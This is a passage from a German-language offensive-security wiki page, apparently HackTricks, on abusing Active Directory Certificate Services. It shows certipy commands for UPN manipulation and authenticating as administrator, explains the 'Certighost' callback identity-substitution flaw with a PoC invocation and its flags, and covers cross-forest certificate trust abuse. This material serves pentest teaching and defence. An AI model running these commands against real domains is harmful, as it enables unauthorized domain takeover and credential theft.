-target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
-template 'User'
```
**Schritt 5: Den UPN des „victim“-Kontos zurücksetzen.**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'victim@corp.local' \
-user 'victim' update
```
**Schritt 6: Als der Zieladministrator authentifizieren.**
```bash
certipy auth \
-dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
-username 'administrator' -domain 'corp.local'
```
## Identitätssubstitution bei Rogue-LDAP/LSA-Chase-Callbacks (Certighost / CVE-2026-54121)

### Erklärung

**Certighost** missbraucht einen **AD CS enrollment chase / callback path**, bei dem die CA anforderergesteuerte Request-Attribute vertraut, um die Identität aufzulösen, die in das ausgestellte Zertifikat aufgenommen werden soll. Im öffentlichen PoC enthält der manipulierte Request:<sup>[[1]](#references)[[2]](#references)</sup>

- **`cdc`**: vom Angreifer kontrollierter Host bzw. IP, den die CA kontaktiert
- **`rmd`**: der **DNS-Name des Ziel-Domain-Controllers**, der imitiert werden soll

Wenn die CA diesem Chase folgt, verbindet sie sich über **SMB/LSA (`445`)** und **LDAP (`389`)** mit dem Angreifer. Der Angreifer verwendet ein **echtes Computerkonto** (normalerweise erstellt über das standardmäßige **`ms-DS-MachineAccountQuota`**), sodass die Callback-Sitzung als gültiger Domain Principal authentifiziert wird. Die Rogue-Dienste geben jedoch stattdessen die Identitätsattribute des **Ziel-DCs** zurück:

- `sAMAccountName`
- `objectSid` / SID
- `dNSHostName`

Wenn die CA die zurückgegebene Identität **nicht kryptografisch an den authentifizierten Callback Principal bindet**, kann sie ein Zertifikat für den **Domain Controller** ausstellen, obwohl sich die Sitzung als das vom Angreifer kontrollierte Computerkonto authentifiziert hat. Dadurch unterscheidet sich der Bug konzeptionell von **Certifried**: Statt AD-Attribute wie `dNSHostName` umzuschreiben, **substituiert der Angreifer Identitätsdaten während der CA-Callback-Auflösung**.<sup>[[2]](#references)</sup>

**Nützliche Voraussetzungen:**

- Credentials für eine **Domain mit niedrigen Berechtigungen**
- Möglichkeit, ein Computerkonto **zu erstellen oder wiederzuverwenden**
- Netzwerkerreichbarkeit von der **CA** zu den vom Angreifer kontrollierten **Ports `389` und `445`**
- Verwundbarer / ungepatchter CA-Request-Pfad (das Microsoft-Update vom **14. Juli 2026** fügte eine **DC-Validierung für `cdc`** sowie einen **Vergleich der aufgelösten SID** hinzu)

Das resultierende **`.pfx`** kann anschließend für **PKINIT** verwendet werden, wodurch ein **`.ccache`** und im veröffentlichten PoC-Ablauf der **NT-Hash des Ziel-DCs** erzeugt werden. Dies reicht normalerweise für eine **vollständige Kompromittierung der Domain** aus.

### Missbrauch

Der öffentliche PoC automatisiert die gesamte Kette:<sup>[[1]](#references)</sup>

1. Ein vom Angreifer kontrolliertes **Computerkonto** erstellen oder wiederverwenden.
2. **Rogue-LDAP- und SMB/LSA-Listener** auf `389` und `445` starten.
3. Einen Certificate Request mit vom Angreifer kontrollierten **`cdc`-** und **`rmd`-Attributen** einreichen.
4. Die CA sich als das kontrollierte Computerkonto bei den Rogue-Listenern authentifizieren lassen, aber die Identity Lookups mit den Attributen des **Ziel-DCs** beantworten.
5. Ein von der CA signiertes **DC-Zertifikat** erhalten und anschließend für **PKINIT** verwenden.
```bash
sudo python3 certighost.py -d playground.local -u lowpriv -p 'Password1234' --dc-ip 192.168.1.10
```
Nützliche runtime flags aus dem PoC:

- `--listener <ip>`: wählt explizit die in `cdc` beworbene Callback-IP aus
- `--computer-name <NAME$>`: verwendet ein bestehendes Machine Account erneut, statt ein neues zu erstellen

**Hinweise zum Betrieb:**

- Der PoC benötigt **root**, da er an die **privilegierten Ports** `389` und `445` gebunden wird.
- Bei erfolgreicher Ausnutzung werden lokal ein **DC `.pfx`** und ein **Kerberos `.ccache`** geschrieben.
- Da das Zertifikat einem **Domain Controller Account** zugeordnet wird, können zu den Folgeaktionen **zertifikatsbasierte Kerberos-Authentifizierung**, **DCSync** und die erneute Verwendung des wiederhergestellten **Machine NT Hash** gehören.<sup>[[2]](#references)</sup>

## Kompromittierung von Forests mit Zertifikaten im Passiv

### Aufbrechen von Forest Trusts durch kompromittierte CAs

Die Konfiguration für **Cross-Forest-Enrollment** wird relativ unkompliziert vorgenommen. Das **Root-CA-Zertifikat** des Resource Forest wird von Administratoren in den **Account Forests veröffentlicht**, und die **Enterprise-CA**-Zertifikate des Resource Forests werden den Containern `NTAuthCertificates` und AIA in jedem Account Forest **hinzugefügt**. Zur Klarstellung: Durch diese Anordnung erhält die **CA im Resource Forest vollständige Kontrolle** über alle anderen Forests, für die sie die PKI verwaltet. Sollte diese CA **von Angreifern kompromittiert werden**, könnten von ihnen Zertifikate für alle Benutzer sowohl im Resource Forest als auch in den Account Forests **gefälscht werden**, wodurch die Sicherheitsgrenze des Forests aufgebrochen würde.<sup>[[6]](#references)</sup>

### Foreign Principals gewährte Enrollment-Berechtigungen

In Multi-Forest-Umgebungen ist Vorsicht im Hinblick auf Enterprise CAs erforderlich, die **Zertifikatvorlagen veröffentlichen**, welche **Authenticated Users oder Foreign Principals** (Benutzer/Gruppen außerhalb des Forests, zu dem die Enterprise CA gehört) **Enrollment- und Bearbeitungsrechte** gewähren.\
Bei der Authentifizierung über einen Trust wird die **Authenticated Users SID** von AD zum Token des Benutzers hinzugefügt. Besitzt eine Domain daher eine Enterprise CA mit einer Vorlage, die **Authenticated Users Enrollment-Rechte gewährt**, könnte ein Benutzer aus einem anderen Forest diese Vorlage möglicherweise **enrollen**. Ebenso wird eine **Cross-Forest-Access-Control-Beziehung geschaffen**, wenn eine Vorlage Enrollment-Rechte ausdrücklich einem Foreign Principal gewährt, wodurch ein Principal aus einem Forest **eine Vorlage aus einem anderen Forest enrollen** kann.

Beide Szenarien führen zu einer **Vergrößerung der Angriffsfläche** von einem Forest zum anderen. Die Einstellungen der Zertifikatvorlage könnten von einem Angreifer ausgenutzt werden, um zusätzliche Berechtigungen in einer fremden Domain zu erlangen.<sup>[[6]](#references)</sup>


## Referenzen

- [1] [aniqfakhrul/CVE-2026-54121 PoC repository](https://github.com/aniqfakhrul/CVE-2026-54121)
- [2] [H0j3n - Certighost technical analysis](https://gist.github.com/H0j3n/a5ef2609b5f2944ac2390a191a534c26)
- [3] [Certify 2.0 – SpecterOps Blog](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [4] [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [5] [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
- [6] [SpecterOps – Certified Pre-Owned: Abusing Active Directory Certificate Services](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [7] [Oliver Lyak – Certipy 4.0: ESC9, ESC10, BloodHound GUI, New Authentication and Request Methods and more](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [8] [SpecterOps – Shadow Credentials: Abusing Key Trust Account Mapping for Account Takeover](https://specterops.io/blog/2021/06/17/shadow-credentials-abusing-key-trust-account-mapping-for-account-takeover/)
- [9] [CQure Academy – The Tale of Enhanced Key (mis)Usage](https://cqureacademy.com/blog/enhanced-key-usage)
- [10] [Compass Security – Relaying to AD Certificate Services over RPC](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/)
- [11] [hajo – ESC12: Shell access to ADCS CA with YubiHSM](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm)
- [12] [SpecterOps – ADCS ESC13 Abuse Technique](https://specterops.io/blog/2024/02/14/adcs-esc13-abuse-technique/)
- [13] [SpecterOps – ADCS ESC14 Abuse Technique](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/)
- [14] [Certipy Wiki – Privilege Escalation (ESC1-ESC17)](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation)
- [15] [TrustedSec – EKUwu: Not Just Another AD CS ESC](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc)
- [16] [Furious5 – AD CS ESC16: Misconfiguration and Exploitation](https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6)

{{#include ../../../banners/hacktricks-training.md}}
